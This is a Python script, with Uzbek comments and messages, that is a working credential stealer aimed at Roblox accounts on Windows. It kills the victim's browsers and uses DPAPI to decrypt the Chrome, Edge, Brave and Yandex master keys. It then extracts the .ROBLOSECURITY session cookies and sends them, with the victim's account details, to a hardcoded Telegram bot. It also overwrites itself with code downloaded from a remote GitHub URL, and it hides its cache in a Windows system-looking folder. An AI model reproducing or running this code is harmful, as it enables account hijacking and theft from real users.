import os
import sys
import subprocess
import json
import base64
import sqlite3
import shutil
import time
from datetime import datetime

# --- KUTUBXONA TEKSHIRISH VA O'RNATISH ---
REQUIRED_PACKAGES = {
    "requests": "requests",
    "psutil": "psutil",
    "Crypto": "pycryptodome",
    "win32crypt": "pypiwin32"
}

print("[DEBUG] Kutubxonalar tekshirilmoqda...")
for module_name, package_name in REQUIRED_PACKAGES.items():
    try:
        __import__(module_name)
    except ImportError:
        print(f"[DEBUG] {package_name} o'rnatilmoqda...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
        except Exception as e:
            print(f"[DEBUG] O'rnatishda xato: {e}")

import requests
import psutil
from Crypto.Cipher import AES
import win32crypt

TELEGRAM_BOT_TOKEN = '8819062469:AAFdy6JsOo_wZCnN2wIyz-noszsZQ_PmyVY'
TELEGRAM_CHAT_ID = '8043397476'

CONFIG_DIR = os.path.join(os.environ.get('LOCALAPPDATA', os.path.expanduser('~')), "Microsoft", "Windows")
CACHE_FILE = os.path.join(CONFIG_DIR, "cache.json")
VERSION_FILE = os.path.join(CONFIG_DIR, "version.txt")

CURRENT_VERSION = "1.0"
VERSION_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/version.txt"
SCRIPT_URL = "https://raw.githubusercontent.com/laughrush43-cell/service/main/core.py"

def debug_print(text):
    current_time = datetime.now().strftime("%H:%M:%S")
    print(f"[{current_time}] {text}", flush=True)

def check_internet():
    try:
        requests.get("https://api.telegram.org", timeout=3)
        return True
    except Exception:
        return False

def check_for_updates():
    try:
        if not check_internet():
            return
        response = requests.get(VERSION_URL, timeout=5)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version != CURRENT_VERSION:
                debug_print("Yangi versiya topildi, yangilanmoqda...")
                script_response = requests.get(SCRIPT_URL, timeout=10)
                if script_response.status_code == 200:
                    current_script_path = os.path.abspath(__file__)
                    with open(current_script_path, "w", encoding="utf-8") as f:
                        f.write(script_response.text)
                    debug_print("Yangilandi! Skript qayta ishga tushirilmoqda...")
                    os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        debug_print(f"Update tekshirishda xato: {e}")

def clean_roblox_cookie(raw_cookie):
    if not raw_cookie:
        return None
    target_keyword = "_|WARNING"
    pos = raw_cookie.find(target_keyword)
    if pos != -1:
        return raw_cookie[pos:]
    return raw_cookie.strip()

def load_cache():
    try:
        if os.path.exists(CACHE_FILE):
            with open(CACHE_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception:
        pass
    return {"sent_cookies": [], "pending_queue": []}

def save_cache(cache_data):
    try:
        if not os.path.exists(CONFIG_DIR):
            os.makedirs(CONFIG_DIR, exist_ok=True)
        with open(CACHE_FILE, "w", encoding="utf-8") as f:
            json.dump(cache_data, f, ensure_ascii=False, indent=4)
    except Exception:
        pass

def get_roblox_user_info(cookie_value):
    if not check_internet():
        return None
    url = "https://users.roblox.com/v1/users/authenticated"
    cookies = {".ROBLOSECURITY": cookie_value}
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
    try:
        response = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            user_id = data.get("id")
            avatar_url = get_user_avatar(user_id)
            return {
                "id": user_id,
                "name": data.get("name"),
                "display": data.get("displayName"),
                "avatar": avatar_url
            }
    except Exception:
        pass
    return None

def get_user_avatar(user_id):
    if not user_id:
        return "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe"
    url = f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={user_id}&size=420x420&format=Png&isCircular=false"
    try:
        res = requests.get(url, timeout=5)
        if res.status_code == 200:
            data = res.json()
            data_list = data.get("data", [])
            if data_list:
                return data_list[0].get("imageUrl")
    except Exception:
        pass
    return "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe"

def send_to_telegram(cookie_value, browser_name):
    if not check_internet():
        return False

    user_info = get_roblox_user_info(cookie_value)
    if user_info:
        username = user_info.get("name", "Noma'lum")
        display_name = user_info.get("display", "Noma'lum")
        user_id = user_info.get("id", "Noma'lum")
        avatar_image = user_info.get("avatar")
        account_info = (
            f"👤 **Username:** `{username}`\n"
            f"🏷 **Nickname:** `{display_name}`\n"
            f"🆔 **User ID:** `{user_id}`\n"
        )
    else:
        avatar_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe"
        account_info = "⚠️ Ma'lumotlarni o'qib bo'lmadi.\n"

    url_photo = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    caption = f"🚨 **ROBLOX ACCOUNT TOPILDI!** 🚨\n\n🌐 **Brauzer:** `{browser_name}`\n⏰ `{current_time}`\n\n{account_info}"
    
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "photo": avatar_image,
        "caption": caption,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url_photo, json=payload, timeout=10)
        time.sleep(0.5)
        msg = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": f"🍪 **Cookie ({browser_name}):**\n>`{cookie_value}`",
            "parse_mode": "Markdown"
        }
        requests.post(f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage", json=msg, timeout=10)
        debug_print(f"[{browser_name}] Telegramga muvaffaqiyatli yuborildi!")
        return True
    except Exception as e:
        debug_print(f"Telegramga yuborishda xato: {e}")
    return False

def kill_browsers(process_names):
    debug_print(f"Brauzerlar yopilmoqda: {process_names}")
    for proc in psutil.process_iter(['name']):
        try:
            p_name = proc.info['name']
            if p_name and any(p in p_name.lower() for p in process_names):
                proc.kill()
        except Exception:
            pass
    time.sleep(1.5)

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception as e:
        debug_print(f"Master key olishda xato: {e}")
        return None

def decrypt_value(encrypted_value, master_key):
    try:
        if encrypted_value[:3] in (b'v10', b'v11'):
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        return None

def scan_browsers():
    debug_print("Brauzerlar skaner qilinmoqda...")
    cache = load_cache()
    sent_cookies = cache.get("sent_cookies", [])
    pending_queue = cache.get("pending_queue", [])

    username = os.getlogin()
    browsers = {
        "Google Chrome": {
            "path": f"C:\\Users\\{username}\\AppData\\Local\\Google\\Chrome\\User Data",
            "procs": ["chrome.exe"]
        },
        "Yandex Browser": {
            "path": f"C:\\Users\\{username}\\AppData\\Local\\Yandex\\YandexBrowser\\User Data",
            "procs": ["browser.exe"]
        },
        "Brave Browser": {
            "path": f"C:\\Users\\{username}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
            "procs": ["brave.exe"]
        },
        "Microsoft Edge": {
            "path": f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Edge\\User Data",
            "procs": ["msedge.exe"]
        }
    }

    for b_name, info in browsers.items():
        base_path = info["path"]
        if not os.path.exists(base_path):
            debug_print(f"Topilmadi (papka yo'q): {b_name}")
            continue

        debug_print(f"Tekshirilmoqda: {b_name}")
        kill_browsers(info["procs"])

        local_state_path = os.path.join(base_path, "Local State")
        if not os.path.exists(local_state_path):
            continue

        master_key = get_master_key(local_state_path)
        if not master_key:
            debug_print(f"Master key olinmadi: {b_name}")
            continue

        profile_folders = ["Default", "Profile 1", "Profile 2", "Profile 3", "Profile 4", ""]
        cookie_paths = []

        for prof in profile_folders:
            if prof:
                p1 = os.path.join(base_path, prof, "Network", "Cookies")
                p2 = os.path.join(base_path, prof, "Cookies")
            else:
                p1 = os.path.join(base_path, "Network", "Cookies")
                p2 = os.path.join(base_path, "Cookies")
                
            if os.path.exists(p1): cookie_paths.append(p1)
            if os.path.exists(p2): cookie_paths.append(p2)

        for idx, cookie_path in enumerate(cookie_paths):
            temp_db = f"temp_{b_name.replace(' ', '_')}_{idx}.db"
            try:
                shutil.copyfile(cookie_path, temp_db)
            except Exception:
                continue

            try:
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT name, encrypted_value FROM cookies WHERE host_key LIKE '%roblox.com%' AND name='.ROBLOSECURITY'")
                rows = cursor.fetchall()
                conn.close()
                os.remove(temp_db)

                for row in rows:
                    if row:
                        decrypted_cookie = decrypt_value(row[1], master_key)
                        if decrypted_cookie:
                            valid_cookie = clean_roblox_cookie(decrypted_cookie)
                            if valid_cookie and len(valid_cookie) >= 50:
                                if valid_cookie not in sent_cookies and not any(item['cookie'] == valid_cookie for item in pending_queue):
                                    debug_print(f"Yangi cookie topildi ({b_name}), navbatga qo'shildi.")
                                    pending_queue.append({"cookie": valid_cookie, "browser": b_name})
            except Exception as e:
                debug_print(f"Baza o'qishda xato ({b_name}): {e}")
                if os.path.exists(temp_db):
                    os.remove(temp_db)

    cache["pending_queue"] = pending_queue
    save_cache(cache)
    debug_print("Skanerlash yakunlandi, internet tsikliga o'tilmoqda...")

def main():
    debug_print("Skript ishga tushdi...")
    check_for_updates()

    # 1. Kompyuter yonganda bir martta barcha brauzerlarni tekshirib chiqamiz
    scan_browsers()

    # 2. Keyin har 30 soniyada faqat internet va navbatdagi cookie'larni tekshirib turamiz
    while True:
        try:
            debug_print("Internet ulanishi tekshirilmoqda...")
            if check_internet():
                cache = load_cache()
                pending_queue = cache.get("pending_queue", [])
                sent_cookies = cache.get("sent_cookies", [])

                if pending_queue:
                    debug_print("Internet bor, navbatdagi cookie'lar yuborilmoqda...")
                    remaining_queue = []

                    for item in pending_queue:
                        cookie_val = item["cookie"]
                        b_name = item["browser"]

                        if send_to_telegram(cookie_val, b_name):
                            if cookie_val not in sent_cookies:
                                sent_cookies.append(cookie_val)
                        else:
                            remaining_queue.append(item)

                    cache["sent_cookies"] = sent_cookies
                    cache["pending_queue"] = remaining_queue
                    save_cache(cache)
                else:
                    debug_print("Navbatda yuboriladigan cookie'lar yo'q.")
            else:
                debug_print("Internet aloqasi yo'q, 30 soniyadan keyin qayta uriniladi...")
        except Exception as e:
            debug_print(f"Internet tekshirish tsiklida xato: {e}")

        debug_print("30 soniya kutish boshlandi...")
        time.sleep(30)

if __name__ == "__main__":
    main()
